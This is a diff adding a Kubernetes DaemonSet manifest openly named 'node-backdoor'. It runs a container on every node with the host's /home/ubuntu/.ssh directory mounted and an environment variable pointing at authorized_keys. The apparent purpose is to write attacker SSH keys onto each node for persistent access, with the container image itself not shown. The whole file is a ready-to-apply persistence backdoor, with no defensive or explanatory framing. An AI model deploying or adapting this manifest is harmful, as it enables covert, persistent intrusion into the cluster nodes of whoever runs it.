@@ -1,0 +1,28 @@
+---
+# TODO fix pod CrashLoopBackOff by adding infinite loop in docker image
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: node-backdoor-daemon
+spec:
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: node-backdoor
+  template:
+    metadata:
+      labels:
+        app.kubernetes.io/name: node-backdoor
+    spec:
+      volumes:
+        - name: host-ssh
+          hostPath:
+            path: /home/ubuntu/.ssh
+      containers:
+        - name: node-backdoor
+          image: vnaumov/k8s-node-backdoor:v0.0.1
+          env:
+            - name: AUTHORIZED_KEYS_PATH
+              value: "/ssh-output/authorized_keys"
+          volumeMounts:
+            - name: host-ssh
+              mountPath: /ssh-output
